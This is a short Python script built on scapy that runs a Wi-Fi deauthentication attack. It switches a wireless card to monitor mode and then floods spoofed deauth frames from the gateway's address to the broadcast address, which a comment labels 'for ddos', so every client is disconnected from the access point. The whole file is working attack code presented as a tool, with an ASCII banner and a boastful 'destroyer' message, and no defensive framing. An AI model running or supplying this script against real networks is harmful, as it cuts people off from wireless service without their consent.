from scapy.all import *
import subprocess
import time

print("""   +++                 .-+++   --         ++      
      ......-++++..  .+-.---++....+++++++.        
  +   ++--------+++------......-----+++...--      
   -- ++------...--+++--....-----......++...+     
      -----......--+..........+........+++..+     
     -----......----........++++++......-+..+     
     ++++--.....-..---...........+-----..----     
     -..---.....+++-..........+++....--..----+++  
   +++++.--...+++.......-......++....--..---+     
  +   ++.--...--........-......--....--..-++      
      +++-------........---....--...------++   +. 
        +++-++--....--+-.++-.....----+++++        
   ..    ..     -...++...++-+++--..-.    -        
                    ++...++.++-  ++++.            
           ++++++++ ++--.--.--+      -++++        
        +++         ++--.--.--+          +        
         ++++++++++++++-.++.+++++++++++++         
                    ----.++...-                   
                   +--...--..-+                   
                   +--...--+..+++                 
                   -++........-++                 
              ++   +++....-+.--++                 
   +++     ++++++  +-.....-++++++ +++++   +++     
  -+++++++++++---+++++++++++++++++---++++++++++-  
  +---------++++---------+++++-----------------+. """)

gateway_mac = getmacbyip(conf.route.route("0.0.0.0")[2])
target_mac = "ff:ff:ff:ff:ff:ff" # target mac address, for ddos use broadcast address ff:ff:ff:ff:ff:ff

dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
deauth = RadioTap()/dot11/Dot11Deauth(reason=random.randint(1,10))
deauth_client = RadioTap()/Dot11(addr1=gateway_mac,addr2=target_mac,addr3=gateway_mac)/Dot11Deauth(reason=random.randint(1,10))

print("Setting interface {} to monitor mode...".format(conf.iface))
subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"])
subprocess.run(["sudo", "ifconfig", "wlp3s0", "down"])
subprocess.run(["sudo", "iwconfig", "wlp3s0", "mode", "monitor"])
subprocess.run(["sudo", "ifconfig", "wlp3s0", "up"])
print("Interface {} has been successfully set to monitor mode")
print("Now I am become Deauth packet, the destroyer of unsecure access points")
print("Starting sending packets to {} to disconnect {} from the access point...".format(gateway_mac, target_mac))
counter = time.time()
while (time.time()-counter) < 10:
    for i in range(64):
        sendp(deauth, iface="{}".format(conf.iface), verbose=0)
    #sendp(deauth_client, iface="{}".format(conf.iface),verbose=0)
    print(".")
    time.sleep(.5)
    #time.sleep(random.randint(5,10))
print()
print("Setting interface {} to managed mode...".format(conf.iface))
subprocess.run(["sudo", "ifconfig", "wlp3s0", "down"])
subprocess.run(["sudo", "iwconfig", "wlp3s0", "mode", "managed"])
subprocess.run(["sudo", "ifconfig", "wlp3s0", "up"])
subprocess.run(["sudo", "systemctl", "start", "NetworkManager.service"])
print("Interface {} has been successfully set to managed mode")  
